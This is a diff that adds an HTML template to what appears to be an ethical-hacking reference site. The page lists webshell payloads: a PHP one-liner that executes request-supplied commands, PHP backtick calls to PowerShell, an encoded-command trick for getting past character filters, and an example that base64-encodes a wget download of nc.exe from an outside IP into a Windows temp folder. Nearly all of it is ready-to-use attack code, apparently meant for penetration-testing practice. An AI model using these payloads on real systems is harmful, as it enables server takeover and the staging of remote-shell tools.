@@ -1,0 +1,24 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h2>1. simple webshell</h2>
+    <div class="code-box"><pre><code>&lt;?php system($_REQUEST['cmd']);?&gt;</code></pre></div>
+
+    <h2>2. powershell script</h2>
+    <div class="code-box"><pre><code>&lt;?=`powershell whoami;`?></code></pre></div>
+
+    <h2>3. when special character '-' is restoricted...</h2>
+    <div class="code-box"><pre><code>&lt;?=`powershell /enc BASE64;`?></code></pre></div>
+    <ul>
+        <ul>EX)</ul>
+        <li><code>echo "wget http://10.10.14.23/nc.exe -o C:\Windows\TEMP\nc.exe" | iconv -t UTF-16LE | base64</code></li>
+    </ul>
+</body>
+</html>
